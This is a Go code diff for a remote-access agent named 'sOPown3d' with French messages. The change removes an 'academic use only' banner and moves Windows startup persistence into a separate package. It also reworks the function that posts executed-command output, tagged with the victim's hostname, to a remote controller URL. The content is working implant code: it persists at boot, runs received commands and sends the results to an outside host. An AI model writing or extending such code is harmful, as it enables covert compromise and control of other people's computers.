@@ -43,12 +43,11 @@ func main() {
 	info := gatherSystemInfo()
 
 	fmt.Println("=== Agent sOPown3d - Version Commandes ===")
-	fmt.Println("Usage académique uniquement")
 	fmt.Println()
 	fmt.Println(jitterCalc.GetStats())
 	fmt.Println()
 
-	setupPersistence()
+	persistence.SetupPersistence()
 
 	fmt.Printf("Agent ID: %s\n", info.Hostname)
 	fmt.Println("En attente de commandes...")
@@ -72,35 +71,6 @@ func main() {
 	}
 }
 
-// Générer ID
-func generateID() string {
-	hostname, _ := os.Hostname()
-	return fmt.Sprintf("%s-%d", hostname, time.Now().Unix())
-}
-
-// Setup persistance au démarrage
-func setupPersistence() {
-	fmt.Println("\n[Persistance] Configuration...")
-
-	exePath, err := os.Executable()
-	if err != nil {
-		fmt.Println("  ✗ Erreur chemin:", err)
-		return
-	}
-
-	if persistent, path := persistence.CheckStartup(); persistent {
-		fmt.Printf("  ✓ Déjà persistant\n  Chemin: %s\n", path)
-	} else {
-		fmt.Println("  ➔ Ajout au démarrage Windows...")
-		if err := persistence.AddToStartup(exePath); err != nil {
-			fmt.Printf("  ✗ Échec: %v\n", err)
-		} else {
-			fmt.Println("  ✓ Persistance activée")
-		}
-	}
-}
-
-// Récupérer infos
 func gatherSystemInfo() shared.AgentInfo {
 	hostname, _ := os.Hostname()
 	return shared.AgentInfo{
@@ -184,7 +154,16 @@ func executeCommand(cmd *shared.Command) string {
 }
 
 func sendOutput(url string, output string) {
-	serializedOutput, _ := json.Marshal(output)
+	hostname, _ := os.Hostname()
+
+	payload := struct {
+		AgentID string `json:"agent_id"`
+		Output  string `json:"output"`
+	}{
+		AgentID: hostname,
+		Output:  output,
+	}
+	serializedOutput, _ := json.Marshal(payload)
 
 	resp, err := http.Post(url, "application/json", bytes.NewBuffer(serializedOutput))
 	if err != nil {
